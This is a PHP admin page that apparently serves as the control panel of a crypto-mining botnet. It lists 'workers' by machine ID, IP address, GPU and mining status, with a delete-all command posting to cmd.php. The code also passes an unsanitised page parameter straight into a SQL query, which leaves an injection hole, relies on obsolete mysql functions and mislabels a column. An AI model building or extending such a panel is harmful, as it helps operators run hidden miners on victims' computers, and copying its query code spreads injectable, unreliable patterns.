<?php
    session_start();
    if($_SESSION['auth'] != 'true'){
        header("Location: index.php");
        die();
    }
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <!-- Bootstrap -->

    <link href="css/style_grdrmam.css" rel="stylesheet">
    <link href="css/volver.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
        <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->

    <script src="js/bootstrap.js"></script>
  </head>
    <body>
        <?php
            include('config.php');
            $cf = mysql_fetch_assoc(mysql_query("SELECT `navbar` FROM `userinfo`"));
            echo "<nav class=\"navbar navbar-".$cf['navbar']."\">";
        ?>
        
            <div class="container-fluid">
                <div class="navbar-header">
                <?php
                    include('config.php');
                    $cf = mysql_fetch_assoc(mysql_query("SELECT `color` FROM `userinfo`"));
                    $nick = mysql_fetch_assoc(mysql_query("SELECT `login` FROM `userinfo`"));
                    
                ?>
                </div>
            </div>
        </nav>
        <div class="container">
           <h4 style="color: white;">All workers: 
                <span style="color: green;">
                    <?php
                        include('config.php');
                        echo mysql_num_rows(mysql_query("SELECT * FROM `workers`"));
                    ?>
                </span>
            </h4>
            <form action="cmd.php" method="post">
                <input type="hidden" name="del" value="1">
                <input type="submit" class="btn btn-danger" value="Delete all users">
            </form>           
            <table class="table table-bordered">
                <thead>
                <tr style="background-color: #1d201a; opacity: 0.9;">
                    <th>ID</th>
                    <th>PC NAME</th>
                    <th>IP </th>
                    <th>GPU NAME</th>
                    <th>VRAM</th>
                    <th>Mining</th>
                    <th>Last seen</th>
                </tr>
                </thead>
                <tbody>
                    <?php
                        include('config.php');
                        $workers;
                        $p1 = 0;
                        $p2 = 0;
                        if(isset($_GET['p'])){
                            $p1 = $_GET['p'];
                            $t1 = $_GET['p'] * 10;
                            $workers = mysql_query("SELECT * FROM `workers` ORDER BY `id` DESC LIMIT $t1, 10");
                        }
                        else{
                            $workers = mysql_query("SELECT * FROM `workers`ORDER BY `id` DESC LIMIT 10");
                        }
                        
                        for ($i = 0; $i < mysql_num_rows($workers); $i++){
                            $curr = mysql_fetch_assoc($workers);

                            echo
                            "
                            <tr style=\"background-color: #D2691E; opacity: 0.9;\">
                            <td>".$curr['id']."</td>
                            <td>".$curr['hwid']."</td>
                            <td>".$curr['ip']."</td>
                            <td>".$curr['gpuname']."</td>
                            <td>".$curr['mining']."</td>
                            <td>".$curr['active']."</td>
                            <td>".$curr['seen']."</td>
                            </tr>
                            ";
                        }
                        if(mysql_num_rows(mysql_query("SELECT * FROM `workers`")) > 10){
                            $p11 = $p1 - 1;
                            $p1 += 1;
                            echo
                            "
                            <ul class=\"pager\">
                                <li><a href=\"?p=$p11\">Previous</a></li>
                                <li><a href=\"?p=$p1\">Next</a></li>
                            </ul>
                            ";
                        }

                    ?>
                </tbody>
            </table>
        </div>

        <?php
            include('config.php');
            $cf = mysql_fetch_assoc(mysql_query("SELECT `navbar` FROM `userinfo`"));
            echo "<nav class=\"navbar navbar-".$cf['navbar']." navbar-fixed-bottom\" style='opacity: 0.7'>";
        ?>

        </nav>
    </body>
</html>